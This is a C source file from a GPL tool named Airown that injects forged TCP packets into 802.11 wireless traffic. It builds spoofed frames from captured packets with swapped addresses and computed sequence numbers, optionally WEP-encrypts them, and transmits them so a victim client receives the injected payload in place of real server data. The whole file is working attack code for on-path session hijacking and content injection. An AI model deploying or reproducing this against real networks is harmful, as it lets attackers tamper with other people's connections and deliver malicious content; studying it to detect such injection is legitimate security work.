/*
 * Airown - injecting TCP packets
 *
 * Copyright (C) 2010 sh0 <sh0@yutani.ee>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

// Int inc
#include "ao_config.h"
#include "ao_util.h"
#include "wep_main.h"
#include "pk_inject_tcp.h"

// Declarations
static gboolean inj_tcp_raw(
    st_ao_packet* pck,
    guint8* payload_data,
    guint32 payload_size,
    guint8 tcp_flags,
    guint32* tcp_seq
);

//#define TCP_TIMESTAMP_ENABLE

/**
 * \brief Inject data into TCP stream.
 * \param pck Received TCP packet that will be replied
 * \param pl_data Payload data
 * |param pl_size Payload size
 */
void inj_tcp(st_ao_packet* pck, guint8* pl_data, guint32 pl_size)
{
    // Debug
    printf("[inj] size=%d\n", pl_size);
    //dumphex(pl_data, pl_size);

    // Sequence
    guint32 tcp_seq = ntohl(pck->m4.tcp.hdr->th_ack);
    
    // Payload MTU
    guint32 mtu = pck->ao_inst->mtu;
    mtu -= sizeof(struct ieee80211_hdr) + LIBNET_802_2SNAP_H; // Layer 2
    mtu -= LIBNET_IPV4_H; // Layer 3
    mtu -= LIBNET_TCP_H; // Layer 4
    mtu -= 30; // Backup bytes
    
    // Fragment - if payload is bigger than MTU then send in multiple chunks
    guint32 offset;
    for (offset = 0; offset < pl_size; offset += mtu){
        guint16 len = pl_size - offset;
        if(len > mtu)
            len = mtu;
        //printf("[inj] sending! offset=%u, len=%u\n", offset, len);
        inj_tcp_raw(pck, pl_data + offset, len, TH_PUSH | TH_ACK, &tcp_seq);
    }

    // Connection reset - terminates the connection. If this is not done
    // then the client will see our payload followed by the real data from net.
    //inj_tcp_raw(pck, NULL, 0, TH_RST | TH_ACK, &tcp_seq);
}

static guint32 ieeeseqnum = 0;

/**
 * \brief Injects one TCP packet into the stream.
 * \param pck Received TCP packet that will be replied
 * \param rsp_data Payload data (can be NULL)
 * \param rsp_len Payload size
 * \param tcp_flags TCP packet flags (TH_SYN, TH_ACK, TH_PUSH, TH_FIN, TH_RST)
 * \param tcp_seq TCP ACK sequence number; it is automatically updated
 */
static gboolean inj_tcp_raw(
    st_ao_packet* pck,
    guint8* payload_data,
    guint32 payload_size,
    guint8 tcp_flags,
    guint32* tcp_seq
) {
    // Debug
    //printf("[inj] sending! len=%u\n", rsp_len);

    // LCPA packet
    lcpa_metapack_t* lcpa = lcpa_init();
    
    // <=======================================================================>
    // IEEE80211 header
    struct ieee80211_hdr hdr_iw;
    g_memmove(&hdr_iw, pck->m2.dot11.iw, sizeof(struct ieee80211_hdr));
    hdr_iw.u1.fchdr = 0;
    hdr_iw.u1.fc.version = pck->m2.dot11.iw->u1.fc.version;
    hdr_iw.u1.fc.type = WLAN_FC_TYPE_DATA;
    hdr_iw.u1.fc.subtype = WLAN_FC_SUBTYPE_DATA; //WLAN_FC_SUBTYPE_QOSDATA;
    hdr_iw.u1.fc.from_ds = 1;
    hdr_iw.u1.fc.wep = pck->ao_inst->wep_enabled ? 1 : 0;
    hdr_iw.duration = 0x0100;
    g_memmove(hdr_iw.addr1, pck->m2.dot11.iw->addr2, 6);
    g_memmove(hdr_iw.addr2, pck->m2.dot11.iw->addr1, 6);
    hdr_iw.u2.seq.fragment = 0;
    hdr_iw.u2.seq.sequence = ieeeseqnum++;
    lcpa_append_copy(lcpa, "IEEE80211", sizeof(struct ieee80211_hdr), (guint8*) &hdr_iw);
    /*
    lcpf_data(
        lcpa, // pack
        WLAN_FC_FROMDS, // WLAN_FC_ISWEP // fcflags
        0x0000, //0x013a, // duration
        pck->m2.dot11.iw->addr2, // mac1
        pck->m2.dot11.iw->addr1, // mac2
        pck->m2.dot11.iw->addr3, // mac3
        pck->m2.dot11.addr4, // mac4
        0, // fragment
        ieeeseqnum++ // sequence
    );
    */
    
    // QOS
    /*
    lcpf_qosheaders(
        lcpa, // pack
        2, // priority
        0, // eosp
        1 // ackpol
    );
    */
    
    // <=======================================================================>
    // LLC header
    struct libnet_802_2snap_hdr hdr_llc;
    g_memmove(&hdr_llc, pck->m2.dot11.llc, sizeof(struct libnet_802_2snap_hdr));
    hdr_llc.snap_type = LLC_TYPE_IPV4;
    lcpa_append_copy(lcpa, "LLC", LIBNET_802_2SNAP_H, (guint8*) &hdr_llc);

    // <=======================================================================>
    // Timestamps - sometimes timestamps are added to the TCP packets to check
    // ping times and to protect stream against sequence number overflow.
    // If we receive a packet with timestamp then we may respond also with
    // timestamp added to our payload packet. This is not required AFAIK
    // and (as seen from field tests) can be omitted.
    guint32 tcp_time_size = 0;
    #ifdef TCP_TIMESTAMP_ENABLE
        guint8 tcp_time_data[12] = {
            0x01, 0x01,
            0x08, 0x0a,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };
        if (pck->m4.tcp.ts != NULL) {
            tcp_time_size = 12;
            guint32 time_b = ntohl(pck->m4.tcp.ts->time_a);
            guint32 time_a = ntohl(pck->m4.tcp.ts->time_b) + 0x01;
            *((guint32*) (tcp_time_data + 4)) = htonl(time_a);
            *((guint32*) (tcp_time_data + 8)) = htonl(time_b);
            pck->ao_inst->ln_thd_t = libnet_build_tcp_options(
                tcp_time_data,
                tcp_time_size,
                pck->ao_inst->ln_inst,
                0 //pck->ao_inst->ln_thd_t
            );
            if (pck->ao_inst->ln_thd_t == -1){
                g_print("[inj] libnet_build_tcp_options returns error: %s\n",
                    libnet_geterror(pck->ao_inst->ln_inst)
                );
                goto err_tcp_options;
            }
        }
    #endif
    
    // Libnet wants the data in host-byte-order
    u_int tcp_ack =
        ntohl(pck->m4.tcp.hdr->th_seq) +
        (
            ntohs(pck->m3.ipv4.hdr->ip_len) -
            pck->m3.ipv4.hdr->ip_hl * 4 -
            pck->m4.tcp.hdr->th_off * 4
        );
    
    // Build TCP header
    pck->ao_inst->ln_tcp_t = libnet_build_tcp(
        ntohs(pck->m4.tcp.hdr->th_dport), // source port
        ntohs(pck->m4.tcp.hdr->th_sport), // dest port
        *tcp_seq, // sequence number
        tcp_ack, // ack number
        tcp_flags, // flags
        0xffff, // window size
        0, // checksum
        0, // urg ptr
        LIBNET_TCP_H + tcp_time_size + payload_size, // TCP + payload length
        (uint8_t*) payload_data, // response
        payload_size, // response_length
        pck->ao_inst->ln_inst, // libnet_t pointer
        pck->ao_inst->ln_tcp_t // ptag
    );
    //g_print("[inj] tcp_size = %d\n", LIBNET_TCP_H + tcp_time_size + payload_size);
    if (pck->ao_inst->ln_tcp_t == -1) {
        g_print("[inj] libnet_build_tcp returns error: %s\n",
            libnet_geterror(pck->ao_inst->ln_inst)
        );
        goto err_tcp_build;
    }

    // Build IPv4 header
    pck->ao_inst->ln_ip_t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + tcp_time_size + payload_size, // length
        0, // TOS bits
        1, // IPID (need to calculate)
        0, // fragmentation
        0xff, // TTL
        6, // protocol
        0, // checksum
        pck->m3.ipv4.hdr->ip_dst.s_addr, // source address
        pck->m3.ipv4.hdr->ip_src.s_addr, // dest address
        NULL, // response
        0, // response length
        pck->ao_inst->ln_inst, // libnet_t pointer
        pck->ao_inst->ln_ip_t // ptag
    );
    //g_print("[inj] ipv4_size = %d\n", LIBNET_IPV4_H + LIBNET_TCP_H + tcp_time_size + payload_size);
    if (pck->ao_inst->ln_ip_t == -1) {
        g_print("[inj] libnet_build_ipv4 returns error: %s\n",
            libnet_geterror(pck->ao_inst->ln_inst)
        );
        goto err_ipv4_build;
    }
    
    // Dump IPv4 + TCP
    u_int32_t lnet_pck_len = 0;
    u_int8_t* lnet_pck_buf = NULL;    
    if (libnet_adv_cull_packet(pck->ao_inst->ln_inst, &lnet_pck_buf, &lnet_pck_len) == -1) {
        printf("[inj] libnet_adv_cull_packet returns error: %s\n",
            libnet_geterror(pck->ao_inst->ln_inst)
        );
        goto err_libnet_dump;
    }
    //g_print("[inj] libnet size = %u\n", lnet_pck_len);
    lcpa_append_copy(lcpa, "IPv4+TCP", lnet_pck_len, lnet_pck_buf);
    libnet_adv_free_packet(pck->ao_inst->ln_inst, lnet_pck_buf);

    // <=======================================================================>
    // Debug
    /*
    lcpa_metapack_t* curlcpa = lcpa;
    while (curlcpa) {
        g_print("[inj] layer=%s, size=%d\n", curlcpa->type, curlcpa->len);
        curlcpa = curlcpa->next;
    }
    */
    
    // Freeze LCPA
    gint send_size = lcpa_size(lcpa);
    if (send_size <= 0) {
        g_message("[inj] error compiling packet!\n");
        goto err_freeze;
    }
    guint8* send_data = (guint8*) g_malloc(send_size);
    lcpa_freeze(lcpa, send_data);
    
    // Debug
    //g_print("[inj] compiled size = %d\n", send_size);
    //dumphex(send_data, send_size);
    
    // <=======================================================================>
    // WEP encryption
    if (pck->ao_inst->wep_enabled) {
        // Encrypt starting from LLC header
        guint32 wep_hdrskip = sizeof(struct ieee80211_hdr);
        guint8 wep_data[0x1000];
        gint32 wep_size = wep_encrypt(
            send_data + wep_hdrskip,
            wep_data,
            send_size - wep_hdrskip,
            pck->ao_inst->wep_key_data,
            pck->ao_inst->wep_key_size
        );
        if (wep_size <= 0) {
            g_print("[inj] error performing WEP encryption!\n");
            goto err_wep;
        }
        
        // Copy new data
        guint8* new_data = (guint8*) g_malloc(wep_hdrskip + wep_size);
        g_memmove(new_data, send_data, wep_hdrskip);
        g_memmove(new_data + wep_hdrskip, wep_data, wep_size);
        
        // Free old buffers
        g_free(send_data);
        
        // Set sending data
        send_data = new_data;
        send_size = wep_hdrskip + wep_size;
    }

    // <=======================================================================>
    // Send the packet
    if (lorcon_send_bytes(pck->lor_ctx, send_size, send_data) < 0) {
        g_print("[inj] unable to transmit packet!\n");
        goto err_send;
    }
    
    // Free LCPA
    g_free(send_data);
    lcpa_free(lcpa);

    // Sequence counter
    *tcp_seq += payload_size;
    
    // Return OK
    return TRUE;
    
    // <=======================================================================>
    // Errors
    err_send:
    err_wep:
        // Free sending data
        g_free(send_data);
    
    err_freeze:
    err_libnet_dump:
    err_ipv4_build:
    err_tcp_build:
    #ifdef TCP_TIMESTAMP_ENABLE
    err_tcp_options:
    #endif
        // LCPA
        lcpa_free(lcpa);
        // Return
        return FALSE;
}

